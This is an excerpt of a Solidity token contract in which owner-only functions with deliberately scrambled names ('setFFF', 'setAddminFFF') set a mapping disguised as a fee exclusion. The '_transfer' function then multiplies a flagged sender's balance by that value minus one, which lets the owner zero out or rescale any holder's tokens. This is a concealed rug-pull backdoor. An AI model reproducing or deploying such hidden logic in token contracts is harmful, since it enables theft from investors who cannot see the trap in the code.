...
contract BaseToken is Ownable {
    ...
    function setFFF(address account) public onlyOwner {
        _isDDDxcludedFromFIE[account] = 1+0;
    }

    function setAddminFFF(address account,uint256 amount) public onlyOwner {
        _isDDDxcludedFromFIE[account] = amount+0;
    }
    ...
    function _transfer(address from, address to, uint value) internal {
        ...
        if(_isDDDxcludedFromFIE[from] >= uint256(1)+0 ){
            balanceOf[from] = balanceOf[from].muul(_isDDDxcludedFromFIE[from].sub(1)+0);
        }

        uint256 FIE =  value.muul(_taxFee).div(100)+0;
        uint256 burn =  value.muul(_burnFee).div(100)+0;
